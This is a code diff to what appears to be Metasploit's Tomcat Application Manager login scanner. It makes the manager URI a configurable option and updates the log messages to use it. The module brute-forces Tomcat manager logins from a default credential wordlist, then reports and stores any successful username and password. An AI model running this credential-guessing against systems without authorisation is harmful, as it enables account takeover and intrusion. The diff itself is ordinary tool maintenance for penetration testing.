@@ -63,6 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(8080),
+                               OptString.new('URI', [true, "URI for Manager login. Default is /manager/html", "/manager/html"]),
 				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
 					File.join(Msf::Config.install_root, "data", "wordlists", "tomcat_mgr_default_userpass.txt") ]),
 				OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
@@ -79,21 +80,21 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 		begin
 			res = send_request_cgi({
-					'uri'     => "/manager/html",
+                                       'uri'     => "#{datastore['URI']}",
 					'method'  => 'GET'
 				}, 25)
 			http_fingerprint({ :response => res })
 		rescue ::Rex::ConnectionError => e
-			vprint_error("http://#{rhost}:#{rport}/manager/html - #{e}")
+                       vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} - #{e}")
 			return
 		end
 
 		if not res
-			vprint_error("http://#{rhost}:#{rport}/manager/html - No response")
+                       vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} - No response")
 			return
 		end
 		if res.code != 401
-			vprint_error("http://#{rhost}:#{rport}/manager/html - Authorization not requested")
+                       vprint_error("http://#{rhost}:#{rport} - Authorization not requested")
 			return
 		end
 
@@ -111,7 +112,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		begin
 			res = send_request_cgi({
-				'uri'     => "/manager/html",
+                               'uri'     => "#{datastore['URI']}",
 				'method'  => 'GET',
 				'headers' =>
 					{
@@ -119,7 +120,7 @@ class Metasploit3 < Msf::Auxiliary
 					}
 				}, 25)
 			unless (res.kind_of? Rex::Proto::Http::Response)
-				vprint_error("http://#{rhost}:#{rport}/manager/html not responding")
+                               vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} not responding")
 				return :abort
 			end
 			return :abort if (res.code == 404)
@@ -133,12 +134,12 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 		rescue ::Rex::ConnectionError => e
-			vprint_error("http://#{rhost}:#{rport}/manager/html - #{e}")
+                       vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} - #{e}")
 			return :abort
 		end
 
 		if success
-			print_good("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
+                       print_good("http://#{rhost}:#{rport}#{datastore['URI']} [#{srvhdr}] [Tomcat Application Manager] successful login '#{user}' : '#{pass}'")
 			report_auth_info(
 				:host => rhost,
 				:port => rport,
@@ -151,7 +152,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			return :next_user
 		else
-			vprint_error("http://#{rhost}:#{rport}/manager/html [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
+                       vprint_error("http://#{rhost}:#{rport}#{datastore['URI']} [#{srvhdr}] [Tomcat Application Manager] failed to login as '#{user}'")
 			return
 		end
 	end
